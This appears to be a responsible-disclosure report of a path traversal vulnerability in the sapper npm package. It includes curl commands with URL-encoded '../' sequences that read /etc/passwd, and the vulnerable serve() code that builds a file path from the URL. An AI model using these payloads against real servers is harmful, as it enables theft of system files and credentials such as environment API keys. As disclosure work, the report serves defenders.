## Original Report

I would like to report a critical path traversal vunerability in the sapper module
It allows an attacker to simply obain arbitrary files from the remote server, exploiting a simple path traversal using URL-encoded "../".

# Module

**module name:** sapper
**version:** 0.27.10
**npm page:** `https://www.npmjs.com/package/sapper`

## Module Description

Sapper is a framework for building high-performance universal web apps. Read the guide or the introductory blog post to learn more.

# Vulnerability

## Vulnerability Description

The vulnerability was found by playing with a sapper / webpack stack while researching vulnerabilities on internal projects. 
I started to dig deeper on how static files were served, and I've noticed that the module allowed a trivial path traversal in its code.

## Steps To Reproduce:

1. Clone https://github.com/sveltejs/sapper-template project
2. `npm i`
3. Use `degit` to obtain the webpack example app: `npx degit "sveltejs/sapper-template#webpack" my-app`
4. `npx sapper dev` - **exploit** with `curl -vv http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
This also works in prod mode with
4. `npx sapper build && node __sapper__build` - **exploit** with `curl -vvv http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd`
 
The reason why the production deployment requires an extra-layer of URL encoding is because this project runs under polka in production, which, contrary to express for example, applies an extra `decodeURIComponent` on the URI.

## Patch

Sapper server simply forms a path with `path.resolve` using the `build_dir` as base directory and the URI-decoded `file` passed in the URL, resulting in a path traversal. 
I am not providing a patch here, but here I've identified the vulnerable code:

sapper/runtime/server.mjs
------------

```
function serve({ prefix, pathname, cache_control }



) {
  const filter = pathname
    ? (req) => req.path === pathname
    : (req) => req.path.startsWith(prefix);

  const cache = new Map();

  const read = dev
    ? (file) => fs.readFileSync(path.resolve(build_dir, file))
    : (file) => (cache.has(file) ? cache : cache.set(file, fs.readFileSync(path.resolve(build_dir, file)))).get(file);

  return (req, res, next) => {
    if (filter(req)) {
    const type = lookup(req.path);

    try {
      const file = decodeURIComponent(req.path.slice(1));
      const data = read(file);

      res.setHeader('Content-Type', type);
      res.setHeader('Cache-Control', cache_control);
      res.end(data);
```

## Supporting Material/References:

- OS: Debian Linux sid
- NodeJS: v10.19.0
- NPM: 6.13.4

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N - I think this is too severe and impacts too many sites to make it public.

## Impact

Any file can be retrieved from the remote server, namely stuff like /proc/self/environ, which would contain any sort of API keys used by the environment the application has been deployed too. This will lead to complete infrastructure RCE and takeover.
